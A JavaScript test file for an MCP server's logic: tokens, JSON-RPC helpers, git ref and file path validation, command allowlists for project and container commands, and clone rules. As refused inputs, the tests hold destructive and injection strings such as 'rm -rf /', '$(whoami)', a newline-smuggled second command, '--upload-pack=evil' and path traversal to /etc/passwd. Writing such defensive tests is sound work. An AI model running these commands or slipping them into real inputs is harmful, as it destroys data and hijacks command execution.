// MCP server pure layer + project-clone decision logic.
// Native-free (no better-sqlite3): everything under test lives in
// lib/mcp-logic.js and mock2/clone-logic.js.

import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';

import {
  MCP_PROTOCOL_VERSION, MCP_KNOWN_VERSIONS, MCP_TOOLS,
  rpcResult, rpcError, toolResult,
  mintMcpToken, hashMcpToken, looksLikeMcpToken, tokenFromRequest,
  mintUploadTicket, looksLikeUploadTicket,
  startupCandidates, validProjectFilePath,
  parseProjectCommand, projectCommandTimeoutMs,
  PROJECT_COMMAND_TIMEOUT_DEFAULT_S, PROJECT_COMMAND_TIMEOUT_MAX_S,
  applyStringEdit, normalizeReadRange, parseGitGrepOutput,
  validSearchPattern, validPathspec, normalizeMaxResults,
  SEARCH_MAX_RESULTS_DEFAULT, SEARCH_MAX_RESULTS_CAP, SEARCH_LINE_CAP,
  validGitRef, normalizeGitLogLimit, parseGitLogOutput, parseGitStatusPorcelain,
  capPatch, GIT_LOG_SEP, GIT_LOG_LIMIT_DEFAULT, GIT_LOG_LIMIT_MAX, GIT_PATCH_CAP,
  normalizeBuildLogLimit, buildLogFromEvents, BUILD_LOG_LIMIT_DEFAULT, BUILD_LOG_LIMIT_MAX,
  validSha256, sha256Hex, zipChecksumError,
  normalizeChunkSeq, decodeChunkBase64, UPLOAD_CHUNK_MAX_BYTES,
  parseLxcListJson, lxcContainerIp, lxcContainerSummaries,
  validFileMode, startupRunTimeoutMs, STARTUP_RUN_TIMEOUT_MAX_S, parseMarkedStreams,
  PROJECT_COMMAND_OUTPUT_CAP,
} from '../lib/mcp-logic.js';
import { computeChangeHash, changePayload, canonicalJson } from '../mock2/change-logic.js';
import { normalizeCloneMode, cloneCopyPatch, cloneSourceError } from '../mock2/clone-logic.js';

// ---- tokens ----

test('mcp tokens: mint shape, hash stability, and request extraction', () => {
  const token = mintMcpToken();
  assert.ok(looksLikeMcpToken(token), token);
  assert.equal(hashMcpToken(token), hashMcpToken(token));
  assert.notEqual(hashMcpToken(token), hashMcpToken(mintMcpToken()));

  // Bearer header wins; tokenized URL path is the fallback.
  assert.equal(tokenFromRequest({ authorization: `Bearer ${token}` }), token);
  assert.equal(tokenFromRequest({ pathToken: token }), token);
  assert.equal(tokenFromRequest({ authorization: 'Bearer nonsense', pathToken: token }), token);
  assert.equal(tokenFromRequest({}), null);
  assert.equal(tokenFromRequest({ authorization: 'Basic dXNlcjpwdw==' }), null);
});

test('mcp upload tickets: shape check rejects arbitrary strings', () => {
  const t = mintUploadTicket();
  assert.ok(looksLikeUploadTicket(t), t);
  assert.equal(looksLikeUploadTicket('../../etc/passwd'), false);
  assert.equal(looksLikeUploadTicket('ppup_short'), false);
});

// ---- JSON-RPC envelopes ----

test('rpc helpers produce spec-shaped envelopes', () => {
  assert.deepEqual(rpcResult(3, { ok: true }), { jsonrpc: '2.0', id: 3, result: { ok: true } });
  const err = rpcError(4, -32601, 'nope');
  assert.equal(err.error.code, -32601);
  assert.equal(err.id, 4);
  // Missing id normalizes to null (spec: error responses to unparseable
  // requests carry id null).
  assert.equal(rpcError(undefined, -32700, 'parse').id, null);
});

test('toolResult wraps data as a text content block; isError marks failures', () => {
  const ok = toolResult({ a: 1 });
  assert.equal(ok.isError, false);
  assert.equal(ok.content[0].type, 'text');
  assert.match(ok.content[0].text, /"a": 1/);
  const bad = toolResult('broken', { isError: true });
  assert.equal(bad.isError, true);
  assert.equal(bad.content[0].text, 'broken');
});

// ---- tool catalog ----

test('tool catalog: every tool has a name, description, and object schema', () => {
  assert.ok(MCP_TOOLS.length >= 10);
  const names = new Set();
  for (const t of MCP_TOOLS) {
    assert.ok(t.name && !names.has(t.name), `duplicate/missing name: ${t.name}`);
    names.add(t.name);
    assert.ok(t.description.length > 20, `${t.name} needs a real description`);
    assert.equal(t.inputSchema.type, 'object');
  }
  // The two-phase deploy pairs both exist for both surfaces.
  for (const required of [
    'list_static_sites', 'inspect_static_site_zip', 'apply_static_site_zip',
    'list_lxc_containers', 'inspect_lxc_zip', 'apply_lxc_zip',
    'read_lxc_file', 'write_lxc_file', 'rerun_startup',
    'list_projects', 'send_project_build', 'clone_project', 'create_upload_ticket',
    'append_upload_chunk', 'finish_upload',
    'interrupt_project_build', 'cancel_queued_build',
    'list_project_files', 'read_project_file', 'write_project_file', 'redeploy_project',
    'run_project_command', 'edit_project_file', 'search_project_files',
    'delete_project_file', 'move_project_file',
    'project_git_log', 'project_git_diff', 'project_git_show',
    'get_build_log', 'append_change_record',
  ]) {
    assert.ok(names.has(required), `missing tool ${required}`);
  }
});

// ---- git history ----

test('validGitRef takes revisions and ranges, refuses option-lookalikes', () => {
  for (const ok of ['HEAD', 'HEAD~3', 'abc1234', 'main', 'refs/heads/main', 'HEAD^', 'a1b2..c3d4', 'v1.2.3']) {
    assert.equal(validGitRef(ok), ok, `should accept ${ok}`);
  }
  // A leading dash would be read by git as an option, not a revision.
  assert.equal(validGitRef('--upload-pack=evil'), null);
  assert.equal(validGitRef('-n'), null);
  assert.equal(validGitRef(''), null);
  assert.equal(validGitRef('a b'), null);
  assert.equal(validGitRef('x'.repeat(201)), null);
  assert.equal(validGitRef('ref;rm -rf /'), null);
});

test('normalizeGitLogLimit defaults and clamps', () => {
  assert.equal(normalizeGitLogLimit(undefined), GIT_LOG_LIMIT_DEFAULT);
  assert.equal(normalizeGitLogLimit(0), GIT_LOG_LIMIT_DEFAULT);
  assert.equal(normalizeGitLogLimit(5), 5);
  assert.equal(normalizeGitLogLimit(99999), GIT_LOG_LIMIT_MAX);
});

test('parseGitLogOutput splits on the unit separator and keeps subjects whole', () => {
  const line = (sha, who, date, subj) => [sha, who, date, subj].join(GIT_LOG_SEP);
  const out = [
    line('a'.repeat(40), 'Ada', '2026-01-01T00:00:00Z', 'first: do the thing'),
    line('b'.repeat(40), 'Grace', '2026-01-02T00:00:00Z', 'second'),
  ].join('\n');
  const rows = parseGitLogOutput(out);
  assert.equal(rows.length, 2);
  assert.equal(rows[0].sha, 'a'.repeat(40));
  assert.equal(rows[0].short_sha, 'aaaaaaaa');
  assert.equal(rows[0].author, 'Ada');
  // A subject with a colon must survive — it is not a delimiter here.
  assert.equal(rows[0].subject, 'first: do the thing');
  assert.deepEqual(parseGitLogOutput(''), []);
});

test('parseGitStatusPorcelain separates untracked from modified', () => {
  const out = [
    ' M src/a.ts',
    'A  src/b.ts',
    '?? src/never-committed.test.ts',
    '?? scratch/',
  ].join('\n');
  const r = parseGitStatusPorcelain(out);
  assert.deepEqual(r.untracked, ['src/never-committed.test.ts', 'scratch/']);
  assert.deepEqual(r.tracked, [{ status: 'M', path: 'src/a.ts' }, { status: 'A', path: 'src/b.ts' }]);
  // A clean tree reports both empty rather than throwing.
  assert.deepEqual(parseGitStatusPorcelain(''), { tracked: [], untracked: [] });
});

test('capPatch truncates only when it must, and says so', () => {
  assert.deepEqual(capPatch('small'), { text: 'small', truncated: false });
  const big = capPatch('x'.repeat(GIT_PATCH_CAP + 10));
  assert.equal(big.text.length, GIT_PATCH_CAP);
  assert.equal(big.truncated, true);
});

// ---- build logs ----

test('normalizeBuildLogLimit defaults and clamps', () => {
  assert.equal(normalizeBuildLogLimit(undefined), BUILD_LOG_LIMIT_DEFAULT);
  assert.equal(normalizeBuildLogLimit(-1), BUILD_LOG_LIMIT_DEFAULT);
  assert.equal(normalizeBuildLogLimit(10), 10);
  assert.equal(normalizeBuildLogLimit(10_000), BUILD_LOG_LIMIT_MAX);
});

test('buildLogFromEvents keeps the TAIL — a failure explains itself at the end', () => {
  const events = Array.from({ length: 10 }, (_, i) => ({
    seq: i + 1, kind: 'step', role: null, content: `step ${i + 1}`, created_at: `t${i + 1}`,
  }));
  const r = buildLogFromEvents(events, 3);
  assert.equal(r.steps.length, 3);
  assert.equal(r.steps[0].content, 'step 8', 'must keep the last events, not the first');
  assert.equal(r.omitted, 7);
  assert.equal(r.total_events, 10);
  assert.match(r.log, /step 10/);
  assert.ok(!r.log.includes('step 1\n'), 'dropped events must not appear in the log');
});

test('buildLogFromEvents survives empty and malformed event lists', () => {
  assert.deepEqual(buildLogFromEvents([]), { steps: [], log: '', omitted: 0, total_events: 0 });
  assert.deepEqual(buildLogFromEvents(null).steps, []);
  const r = buildLogFromEvents([{ seq: 1, kind: 'note' }]);
  assert.equal(r.steps.length, 1);
  assert.ok(typeof r.log === 'string');
});

// ---- the change-record chain ----
//
// append_change_record must NEVER hand-compute a hash. These pin the reason:
// the canonical payload is an explicit field allowlist, not "the record minus
// its hashes", so the two agree only by coincidence.

test('the change payload is an allowlist — extra fields are excluded from the hash', () => {
  const base = {
    project_id: 51, cycle_id: null, seq: 1, initiated_by: 'u1', acting_as_admin: 1,
    framework_version: 17, framework_version_id: 17, rules_touched: null,
    gates_run: null, commit_sha: 'abc', summary: 'x', created_at: '2026-01-01T00:00:00Z',
  };
  const withExtra = { ...base, id: 999, note: 'not part of the intent', hash: 'zz', prev_hash: 'yy' };
  // The DB id, and anything else not on the allowlist, must not move the hash.
  assert.equal(computeChangeHash('', base), computeChangeHash('', withExtra));
  assert.ok(!('id' in changePayload(withExtra)));
  assert.ok(!('note' in changePayload(withExtra)));
});

test('hand-computing the hash as "record minus its hashes" disagrees with the real chain', () => {
  const row = {
    project_id: 51, cycle_id: 786, seq: 22, initiated_by: 'u1', acting_as_admin: 1,
    framework_version: 17, framework_version_id: 17, rules_touched: null,
    gates_run: null, commit_sha: 'abc', summary: 'x', created_at: '2026-01-01T00:00:00Z',
    id: 4242, prev_hash: 'deadbeef', hash: 'ignored',
  };
  const real = computeChangeHash('deadbeef', row);

  // The plausible-looking recipe: everything except hash/prev_hash, keys
  // sorted, compact separators. It picks up `id` and so produces a DIFFERENT
  // hash — which is exactly how a hand-appended record starts looking
  // verified while chaining to nothing.
  const { hash: _h, prev_hash: _p, ...rest } = row;
  const naive = createHash('sha256')
    .update('deadbeef' + JSON.stringify(Object.fromEntries(Object.entries(rest).sort())))
    .digest('hex');
  assert.notEqual(naive, real, 'the naive recipe must not be mistaken for the real one');

  // And the real one is reproducible from the documented pieces.
  assert.equal(
    real,
    createHash('sha256').update('deadbeef' + canonicalJson(changePayload(row))).digest('hex'),
  );
});

test('acting_as_admin is normalized, so a boolean and a 1 chain identically', () => {
  const a = { seq: 1, summary: 's', acting_as_admin: true };
  const b = { seq: 1, summary: 's', acting_as_admin: 1 };
  assert.equal(computeChangeHash('', a), computeChangeHash('', b));
  // ...and a falsy value is 0, not absent.
  assert.equal(changePayload({ acting_as_admin: false }).acting_as_admin, 0);
});

test('read_project_file advertises the line-range parameters', () => {
  const read = MCP_TOOLS.find((t) => t.name === 'read_project_file');
  assert.ok(read.inputSchema.properties.offset, 'offset must be documented');
  assert.ok(read.inputSchema.properties.limit, 'limit must be documented');
  // Still only path + project_id are mandatory: a whole-file read is the
  // default and existing callers must not have to change.
  assert.deepEqual(read.inputSchema.required, ['project_id', 'path']);
});

// ---- edit_project_file ----

test('applyStringEdit replaces exactly once by default', () => {
  const r = applyStringEdit('a\nHELLO\nb\n', 'HELLO', 'WORLD');
  assert.equal(r.content, 'a\nWORLD\nb\n');
  assert.equal(r.replaced, 1);
});

test('applyStringEdit refuses an ambiguous match unless the count is declared', () => {
  const src = 'x\nx\nx\n';
  const ambiguous = applyStringEdit(src, 'x', 'y');
  assert.ok(ambiguous.error);
  assert.match(ambiguous.error, /appears 3 time\(s\)/);
  assert.ok(!ambiguous.content, 'must not edit when the count is unexpected');

  // Declaring the real count is the way to say "yes, all of them".
  const all = applyStringEdit(src, 'x', 'y', 3);
  assert.equal(all.content, 'y\ny\ny\n');
  assert.equal(all.replaced, 3);

  // A count that is too HIGH is refused too — the caller's model of the file
  // is wrong either way.
  assert.ok(applyStringEdit(src, 'x', 'y', 5).error);
});

test('applyStringEdit refuses absent, empty and no-op edits', () => {
  assert.match(applyStringEdit('abc', 'zzz', 'q').error, /not found/);
  assert.ok(applyStringEdit('abc', '', 'q').error);
  assert.match(applyStringEdit('abc', 'abc', 'abc').error, /identical/);
  assert.ok(applyStringEdit('abc', 'a', 'b', 0).error, 'expect_occurrences must be >= 1');
  assert.ok(applyStringEdit('abc', 'a', 'b', 1.5).error);
});

test('applyStringEdit is literal, not regex — pasted code is not a pattern', () => {
  const src = 'if (a.b) { c(1); }\n';
  const r = applyStringEdit(src, 'a.b', 'a.z');
  assert.equal(r.content, 'if (a.z) { c(1); }\n');
  // '.' must not have matched 'a-b' style text elsewhere, and a regex-special
  // old_string is found by its literal characters.
  assert.equal(applyStringEdit('a.b and axb', 'a.b', 'Q').replaced, 1);
  assert.ok(applyStringEdit('literal (paren)', '(paren)', '[bracket]').content);
});

test('applyStringEdit can delete text with an empty new_string', () => {
  const r = applyStringEdit('keep\nDROP\n', 'DROP\n', '');
  assert.equal(r.content, 'keep\n');
});

// ---- search_project_files ----

test('parseGitGrepOutput turns path:line:content into structured hits', () => {
  const out = 'src/a.ts:12:const x = 1;\nsrc/b.ts:3:function y() {\n';
  assert.deepEqual(parseGitGrepOutput(out), [
    { path: 'src/a.ts', line_number: 12, line: 'const x = 1;' },
    { path: 'src/b.ts', line_number: 3, line: 'function y() {' },
  ]);
  assert.deepEqual(parseGitGrepOutput(''), []);
});

test('parseGitGrepOutput honours the result cap and truncates giant lines', () => {
  const many = Array.from({ length: 50 }, (_, i) => `f.ts:${i + 1}:hit`).join('\n');
  assert.equal(parseGitGrepOutput(many, 10).length, 10);
  // A minified bundle line must not blow up the response.
  const huge = `bundle.js:1:${'z'.repeat(SEARCH_LINE_CAP + 500)}`;
  assert.equal(parseGitGrepOutput(huge)[0].line.length, SEARCH_LINE_CAP);
});

test('parseGitGrepOutput keeps colons that belong to the matched line', () => {
  const [hit] = parseGitGrepOutput('src/a.ts:7:const url = "http://x";');
  assert.equal(hit.line_number, 7);
  assert.equal(hit.line, 'const url = "http://x";');
});

test('search inputs: patterns keep their regex punctuation, pathspecs stay relative', () => {
  assert.equal(validSearchPattern('function\\s+\\w+'), 'function\\s+\\w+');
  assert.equal(validSearchPattern('a|b(c)[d]'), 'a|b(c)[d]');
  assert.equal(validSearchPattern(''), null);
  assert.equal(validSearchPattern('   '), null);
  assert.equal(validSearchPattern('x'.repeat(1001)), null);
  assert.equal(validSearchPattern('bad\u0000null'), null);

  assert.equal(validPathspec('src/**/*.ts'), 'src/**/*.ts');
  assert.equal(validPathspec('apps/freshcut'), 'apps/freshcut');
  assert.equal(validPathspec('/etc'), null);
  assert.equal(validPathspec('../outside'), null);
  assert.equal(validPathspec(''), null);
});

test('normalizeMaxResults defaults and clamps', () => {
  assert.equal(normalizeMaxResults(undefined), SEARCH_MAX_RESULTS_DEFAULT);
  assert.equal(normalizeMaxResults(0), SEARCH_MAX_RESULTS_DEFAULT);
  assert.equal(normalizeMaxResults('x'), SEARCH_MAX_RESULTS_DEFAULT);
  assert.equal(normalizeMaxResults(25), 25);
  assert.equal(normalizeMaxResults(999999), SEARCH_MAX_RESULTS_CAP);
});

// ---- ranged reads ----

test('normalizeReadRange leaves an unranged read alone', () => {
  const r = normalizeReadRange(undefined, undefined);
  assert.equal(r.ranged, false, 'no offset/limit must stay a whole-file read');
  assert.equal(r.start, 1);
  assert.equal(r.count, null);
});

test('normalizeReadRange builds an inclusive 1-based window', () => {
  const r = normalizeReadRange(100, 20);
  assert.deepEqual({ start: r.start, end: r.end, count: r.count, ranged: r.ranged },
    { start: 100, end: 119, count: 20, ranged: true });

  // offset alone runs to the end of the file
  const openEnded = normalizeReadRange(50, undefined);
  assert.equal(openEnded.start, 50);
  assert.equal(openEnded.end, null);
  assert.equal(openEnded.ranged, true);

  // limit alone starts at line 1
  const fromTop = normalizeReadRange(undefined, 5);
  assert.equal(fromTop.start, 1);
  assert.equal(fromTop.end, 5);
  assert.equal(fromTop.ranged, true);
});

test('normalizeReadRange ignores nonsense rather than producing a bad window', () => {
  for (const bad of [0, -5, 'abc', NaN]) {
    const r = normalizeReadRange(bad, bad);
    assert.equal(r.start, 1);
    assert.equal(r.count, null);
    assert.equal(r.ranged, false);
  }
  assert.equal(normalizeReadRange(3.7, 2.9).start, 3, 'fractions floor');
  assert.equal(normalizeReadRange(3.7, 2.9).count, 2);
});

// ---- run_project_command allowlist ----

test('parseProjectCommand accepts the four permitted shapes', () => {
  assert.deepEqual(parseProjectCommand('npm run gates').argv, ['npm', 'run', 'gates']);
  assert.deepEqual(parseProjectCommand('npm ci').argv, ['npm', 'ci']);
  assert.deepEqual(parseProjectCommand('  npm   run   test:unit  ').argv, ['npm', 'run', 'test:unit']);
  assert.deepEqual(
    parseProjectCommand('npx playwright test --reporter=list').argv,
    ['npx', 'playwright', 'test', '--reporter=list'],
  );
  assert.deepEqual(parseProjectCommand('git status').argv, ['git', 'status']);
  assert.deepEqual(parseProjectCommand('git log -5 --oneline').argv, ['git', 'log', '-5', '--oneline']);
  // Paths and script names with the punctuation real projects use.
  assert.ok(parseProjectCommand('npx playwright test e2e/platform.spec.ts').argv);
  assert.ok(parseProjectCommand('npm run build:prod').argv);
});

test('parseProjectCommand refuses anything outside the allowlist', () => {
  for (const cmd of ['rm -rf /', 'curl https://x.example', 'node server.js', 'sh', 'sudo npm ci', 'bash -c ls']) {
    assert.ok(parseProjectCommand(cmd).error, `should refuse: ${cmd}`);
  }
  // npm/npx/git are heads, not blank cheques.
  assert.ok(parseProjectCommand('npm install left-pad').error);
  assert.ok(parseProjectCommand('npm ci --extra').error, 'npm ci takes no arguments');
  assert.ok(parseProjectCommand('npm run').error, 'npm run needs a script name');
  assert.ok(parseProjectCommand('npx tsx evil.ts').error);
  // Destructive git subcommands stay out — see the exclusion note in the source.
  for (const sub of ['push', 'commit', 'checkout', 'branch', 'tag', 'stash', 'reset', 'clean']) {
    assert.ok(parseProjectCommand(`git ${sub}`).error, `git ${sub} should be refused`);
  }
  assert.ok(parseProjectCommand('').error);
  assert.ok(parseProjectCommand(null).error);
});

test('parseProjectCommand refuses shell syntax rather than running it as an argument', () => {
  for (const cmd of [
    'npm run gates; rm -rf /',
    'npm run gates && curl x',
    'npm run gates | tee out',
    'npm run gates > /etc/passwd',
    'npm run $(whoami)',
    'npm run `id`',
    "npm run 'a b'",
    'git log --format=%H\nrm -rf /',
  ]) {
    const r = parseProjectCommand(cmd);
    assert.ok(r.error, `should refuse: ${JSON.stringify(cmd)}`);
    assert.ok(!r.argv, 'must not hand back an argv it half-understood');
  }
  // The refusal has to teach, or the model just retries the same string.
  assert.match(parseProjectCommand('npm run a && npm run b').error, /separate calls/);
});

test('projectCommandTimeoutMs defaults, clamps, and ignores nonsense', () => {
  assert.equal(projectCommandTimeoutMs(undefined), PROJECT_COMMAND_TIMEOUT_DEFAULT_S * 1000);
  assert.equal(projectCommandTimeoutMs(0), PROJECT_COMMAND_TIMEOUT_DEFAULT_S * 1000);
  assert.equal(projectCommandTimeoutMs(-9), PROJECT_COMMAND_TIMEOUT_DEFAULT_S * 1000);
  assert.equal(projectCommandTimeoutMs('nope'), PROJECT_COMMAND_TIMEOUT_DEFAULT_S * 1000);
  assert.equal(projectCommandTimeoutMs(30), 30_000);
  assert.equal(projectCommandTimeoutMs(99_999), PROJECT_COMMAND_TIMEOUT_MAX_S * 1000);
});

test('protocol versions: ours is among the known list', () => {
  assert.ok(MCP_KNOWN_VERSIONS.includes(MCP_PROTOCOL_VERSION));
});

test('startupCandidates finds .sh files and the startup.sh default', () => {
  const entries = [
    { path: 'index.html', isDirectory: false },
    { path: 'startup.sh', isDirectory: false },
    { path: 'scripts/build.sh', isDirectory: false },
    { path: 'scripts', isDirectory: true },
  ];
  const c = startupCandidates(entries);
  assert.deepEqual(c.scripts, ['startup.sh', 'scripts/build.sh']);
  assert.equal(c.defaultScript, 'startup.sh');
  assert.equal(startupCandidates([{ path: 'a.txt', isDirectory: false }]).defaultScript, null);
});

test('validProjectFilePath: relative app paths only — no traversal, no .git, no absolutes', () => {
  assert.equal(validProjectFilePath('src/server/routes.ts'), 'src/server/routes.ts');
  assert.equal(validProjectFilePath('./package.json'), 'package.json');
  assert.equal(validProjectFilePath('a dir/with spaces.md'), 'a dir/with spaces.md');
  assert.equal(validProjectFilePath('/etc/passwd'), null);
  assert.equal(validProjectFilePath('../outside'), null);
  assert.equal(validProjectFilePath('src/../../etc'), null);
  assert.equal(validProjectFilePath('.git/config'), null);
  assert.equal(validProjectFilePath('src//double'), null);
  assert.equal(validProjectFilePath('back\\slash'), null);
  assert.equal(validProjectFilePath(''), null);
  assert.equal(validProjectFilePath('bad\u0000byte'), null);
});

// ---- clone logic ----

test('normalizeCloneMode accepts fresh/full and rejects everything else', () => {
  assert.equal(normalizeCloneMode('fresh'), 'fresh');
  assert.equal(normalizeCloneMode(' FULL '), 'full');
  assert.equal(normalizeCloneMode('database'), null);
  assert.equal(normalizeCloneMode(''), null);
});

test('cloneCopyPatch carries settings, never identity or runtime state', () => {
  const patch = cloneCopyPatch({
    id: 7, name: 'Src', slug: 'src', container_name: 'm2-7', deployed_commit: 'abc',
    description: 'a thing', design_preset: 'portal-blue', harness: 'claude',
    suggest_mode: 'ask', clarify_mode: 'on', design_approved_at: '2026-01-01T00:00:00Z',
    design_inventory_seq: 4, current_mockup_id: 99, custom_domain: 'example.com',
  });
  assert.deepEqual(patch, {
    description: 'a thing', design_preset: 'portal-blue', harness: 'claude',
    suggest_mode: 'ask', clarify_mode: 'on', design_approved_at: '2026-01-01T00:00:00Z',
    design_inventory_seq: 4,
  });
  assert.ok(!('slug' in patch) && !('container_name' in patch) && !('current_mockup_id' in patch));
  // custom_domain is identity too: only one project can hold a hostname, so a
  // clone must claim its own base domain rather than inherit the source's.
  assert.ok(!('custom_domain' in patch));
});

test('cloneSourceError: fresh works from archived; full needs the source active', () => {
  const base = { repo_path: '/repos/1.git' };
  assert.equal(cloneSourceError({ ...base, lifecycle: 'active' }, 'fresh'), null);
  assert.equal(cloneSourceError({ ...base, lifecycle: 'archived' }, 'fresh'), null);
  assert.equal(cloneSourceError({ ...base, lifecycle: 'active' }, 'full'), null);
  assert.match(cloneSourceError({ ...base, lifecycle: 'archived' }, 'full'), /online/);
  assert.match(cloneSourceError({ ...base, lifecycle: 'provisioning' }, 'fresh'), /provisioning/);
  assert.match(cloneSourceError(null, 'fresh'), /not found/);
  assert.match(cloneSourceError({ lifecycle: 'active' }, 'fresh'), /repository/);
});

// ---- bugfix helpers: zip integrity, chunked upload, LXC list, mode, timeouts ----

test('validSha256 normalizes hex and rejects everything else', () => {
  const hex = 'A'.repeat(64);
  assert.equal(validSha256(hex), 'a'.repeat(64));
  assert.equal(validSha256(` ${'b'.repeat(64)} `), 'b'.repeat(64));
  assert.equal(validSha256('b'.repeat(63)), null);
  assert.equal(validSha256('g'.repeat(64)), null);
  assert.equal(validSha256(''), null);
  assert.equal(validSha256(null), null);
});

test('zipChecksumError: matching bytes pass; corruption names both hashes', () => {
  const buf = Buffer.from('zip bytes');
  const good = createHash('sha256').update(buf).digest('hex');
  assert.equal(zipChecksumError(buf, good), null);
  assert.equal(zipChecksumError(buf, good.toUpperCase()), null);
  // A flipped byte is reported as TRANSPORT corruption, with declared vs got.
  const err = zipChecksumError(Buffer.from('zip byteX'), good);
  assert.match(err, /corrupted/);
  assert.match(err, new RegExp(good));
  assert.match(err, new RegExp(sha256Hex(Buffer.from('zip byteX'))));
  // A malformed declared value is its own error, not a mismatch.
  assert.match(zipChecksumError(buf, 'not-a-hash'), /64-character/);
});

test('normalizeChunkSeq takes whole numbers from 0, refuses the rest', () => {
  assert.equal(normalizeChunkSeq(0), 0);
  assert.equal(normalizeChunkSeq(7), 7);
  assert.equal(normalizeChunkSeq('3'), 3);
  assert.equal(normalizeChunkSeq(-1), null);
  assert.equal(normalizeChunkSeq(1.5), null);
  assert.equal(normalizeChunkSeq('x'), null);
  assert.equal(normalizeChunkSeq(undefined), null);
});

test('decodeChunkBase64 round-trips, tolerates whitespace, enforces the cap', () => {
  const payload = Buffer.from('chunk of a zip');
  const ok = decodeChunkBase64(payload.toString('base64'));
  assert.ok(!ok.error);
  assert.deepEqual(ok.buf, payload);
  // Whitespace (line-wrapped base64) is fine; garbage is not.
  const wrapped = payload.toString('base64').replace(/(.{4})/g, '$1\n');
  assert.deepEqual(decodeChunkBase64(wrapped).buf, payload);
  assert.match(decodeChunkBase64('!!not base64!!').error, /base64/);
  assert.match(decodeChunkBase64('').error, /required/);
  assert.match(decodeChunkBase64(undefined).error, /required/);
  // Over-cap chunks are refused with the split-it-up instruction.
  const big = Buffer.alloc(UPLOAD_CHUNK_MAX_BYTES + 1).toString('base64');
  assert.match(decodeChunkBase64(big).error, /split/);
});

test('parseLxcListJson: an unparseable or non-array answer is an ERROR, never []', () => {
  assert.deepEqual(parseLxcListJson('[]').list, []);
  assert.equal(parseLxcListJson(JSON.stringify([{ name: 'pp-Web' }])).list.length, 1);
  // Truncated JSON (the 256 KB capture cap) must not read as an empty host —
  // that is exactly the field failure that had an agent plan a duplicate
  // container.
  assert.match(parseLxcListJson('[{"name": "pp-W').error, /truncated/);
  assert.match(parseLxcListJson('{"not": "an array"}').error, /not an array/);
});

test('lxcContainerIp prefers eth0 but falls back to any non-lo global inet', () => {
  const addr = (address, family = 'inet', scope = 'global') => ({ address, family, scope });
  assert.equal(lxcContainerIp({ network: { eth0: { addresses: [addr('10.0.0.5')] } } }), '10.0.0.5');
  // Renamed NIC still yields the address; lo and link-local never do.
  assert.equal(lxcContainerIp({
    network: {
      lo: { addresses: [addr('127.0.0.1', 'inet', 'local')] },
      enp5s0: { addresses: [addr('fe80::1', 'inet6'), addr('192.168.1.9')] },
    },
  }), '192.168.1.9');
  assert.equal(lxcContainerIp({ network: { eth0: { addresses: [addr('fd42::7', 'inet6')] } } }), null);
  assert.equal(lxcContainerIp(null), null);
});

test('lxcContainerSummaries filters by prefix, strips it, and dedupes across projects', () => {
  const list = [
    { name: 'pp-Web', status: 'Running', state: { network: { eth0: { addresses: [{ address: '10.1.2.3', family: 'inet', scope: 'global' }] } } } },
    { name: 'unrelated', status: 'Running' },
    { name: 'pp-Web', status: 'Stopped' },      // same name from another project
    { name: 'pp-db', status: 'Stopped', state: null },
  ];
  const rows = lxcContainerSummaries(list, 'pp-');
  assert.deepEqual(rows, [
    { name: 'Web', status: 'Running', ip: '10.1.2.3' },
    { name: 'db', status: 'Stopped', ip: null },
  ]);
  // Case is preserved: the guest is pp-Web, not pp-web.
  assert.equal(rows[0].name, 'Web');
});

test('validFileMode: three octal digits with or without the leading zero', () => {
  assert.equal(validFileMode('0755'), '755');
  assert.equal(validFileMode('755'), '755');
  assert.equal(validFileMode('644'), '644');
  assert.equal(validFileMode('0644'), '644');
  // No setuid digit, no symbolic modes, no garbage.
  assert.equal(validFileMode('4755'), null);
  assert.equal(validFileMode('u+x'), null);
  assert.equal(validFileMode('758'), null);
  assert.equal(validFileMode(''), null);
  assert.equal(validFileMode(755), '755');
});

test('startupRunTimeoutMs: caller wins clamped; env default is clamped too', () => {
  assert.equal(startupRunTimeoutMs(300, 120000), 300000);
  assert.equal(startupRunTimeoutMs(99999, 120000), STARTUP_RUN_TIMEOUT_MAX_S * 1000);
  // No caller value → the operator's configured default…
  assert.equal(startupRunTimeoutMs(undefined, 120000), 120000);
  assert.equal(startupRunTimeoutMs(0, 90000), 90000);
  // …which cannot itself exceed the cap, nor be nonsense.
  assert.equal(startupRunTimeoutMs(undefined, 10 * 3600 * 1000), STARTUP_RUN_TIMEOUT_MAX_S * 1000);
  assert.equal(startupRunTimeoutMs(undefined, NaN), 120000);
});

test('parseMarkedStreams recovers exit code and both tails; missing marker → found:false', () => {
  const nonce = 'abc123';
  const out = [
    'noise the script printed before the wrapper reported',
    `PP_${nonce}_EXIT:2`,
    `PP_${nonce}_OUT`,
    'stdout line 1',
    'stdout line 2',
    '',
    `PP_${nonce}_ERR`,
    'stderr tail',
  ].join('\n');
  const r = parseMarkedStreams(out, nonce);
  assert.equal(r.found, true);
  assert.equal(r.exit_code, 2);
  // The blank separator line the wrapper echoes is stripped; the script's own
  // trailing newline survives.
  assert.equal(r.stdout, 'stdout line 1\nstdout line 2\n');
  assert.equal(r.stderr, 'stderr tail');
  // The wrapper never reporting (timeout, container down) is distinguishable
  // from a reported empty run.
  const dead = parseMarkedStreams('incus: instance not found', nonce);
  assert.equal(dead.found, false);
  assert.equal(dead.exit_code, null);
  // A different nonce cannot be confused by lookalike markers in output.
  assert.equal(parseMarkedStreams(out, 'ffffff').found, false);
  assert.ok(PROJECT_COMMAND_OUTPUT_CAP >= 64 * 1024);
});

// ---- cycle 2: run_lxc_command allowlist + get_lxc_container detail ----

import { readFileSync } from 'node:fs';
import {
  parseLxcCommand, lxcCommandTimeoutMs, lxcContainerDetail,
} from '../lib/mcp-logic.js';

const LXC_POLICY = JSON.parse(
  readFileSync(new URL('../lib/mcp-policy/lxc-command-allowlist.json', import.meta.url), 'utf8'),
);
const WD = { workingDir: '/opt/app', registeredWorkingDir: '/opt/app' };

test('parseLxcCommand: read-only allowlist admits observe commands anywhere', () => {
  for (const cmd of [
    'docker compose ps -a', 'docker ps', 'docker logs web --tail=50',
    'systemctl status docker', 'journalctl -u docker.service -n 100',
    'ip addr', 'ip -4 route', 'ss -ltnp', 'sysctl -n kernel.keys.maxkeys',
    'curl -sSI http://127.0.0.1:3000/', 'df -h', 'free -m', 'uname -a',
    'cat /etc/os-release', 'ls -la /opt/app', 'stat /opt/app/startup.sh', 'du -sh /var/lib/docker',
  ]) {
    const r = parseLxcCommand(cmd, LXC_POLICY, { workingDir: '/anywhere', registeredWorkingDir: null });
    assert.equal(r.error, undefined, `${cmd} → ${r.error}`);
    assert.equal(r.scope, 'read_only', cmd);
  }
});

